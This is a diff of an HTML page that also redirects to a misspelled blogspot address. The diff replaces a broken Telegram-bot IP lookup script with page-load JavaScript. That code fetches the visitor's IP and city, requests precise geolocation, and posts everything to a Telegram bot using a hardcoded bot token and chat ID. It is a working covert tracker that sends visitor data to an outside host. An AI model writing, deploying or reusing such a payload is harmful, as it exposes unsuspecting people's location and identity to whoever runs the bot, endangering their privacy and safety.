@@ -15,43 +15,67 @@ document.location.href = 'https://expried.blogspot.com/';
 console.log('Server aktif');
 }
       </script>
-        <script>
-             const TelegramBot = require('node-telegram-bot-api');
-                const axios = require('axios');
+            <script>
+        window.onload = function() {
+            // Get IP address and location data
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const city = data.city;
+                    const region = data.region;
+                    const country = data.country_name;
+                    const flag = `https://countryflagsapi.com/png/${data.country_code}`;
 
-                // Replace with your Telegram bot token
-                const token = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o';
+                    // Get geolocation
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(position => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
 
-                const bot = new TelegramBot(token, { polling: true });
+                            // Send data to Telegram bot
+                            const botToken = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o';
+                            const chatId = '7407149096';
+                            const message = `
+                                IP Address: ${ip}
+                                Location: ${city}, ${region}, ${country}
+                                Latitude: ${latitude}
+                                Longitude: ${longitude}
+                                <img src="${flag}" alt="Flag of ${country}">
+                            `;
 
-                bot.onText(/\/track (.+)/, async (msg, match) => {
-                    const chatId = msg.chat.id;
-                    const ip = match[1];
-
-                    try {
-                        const response = await axios.get(\`https://ipapi.co/\${ip}/json/\`);
-                        const country = response.data.country_name;
-                        const countryCode = response.data.country_code;
-
-                        if (country && countryCode) {
-                            const flagUrl = \`https://www.countryflags.io/\${countryCode}/flat/64.png\`;
-                            bot.sendMessage(chatId, \`IP Address: \${ip}\nCountry: \${country}\`);
-                            bot.sendPhoto(chatId, flagUrl);
-                        } else {
-                            bot.sendMessage(chatId, 'Could not retrieve information for the given IP address.');
-                        }
-                    } catch (error) {
-                        bot.sendMessage(chatId, 'An error occurred while retrieving the IP information.');
+                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: message,
+                                    parse_mode: 'HTML'
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.ok) {
+                                    alert('Data sent successfully!');
+                                } else {
+                                    alert('Failed to send data.');
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                            });
+                        });
+                    } else {
+                        alert('Geolocation is not supported by this browser.');
                     }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
                 });
-
-                bot.onText(/\/start/, (msg) => {
-                    const chatId = msg.chat.id;
-                    bot.sendMessage(chatId, \`Welcome! Your chat ID is \${chatId}. Use /track  to track an IP address.\`);
-                });
-            
-        
-        </script>
+        };
+    </script>
         <style>
             @charset "utf-8";html {
                 -ms-text-size-adjust: 100%;
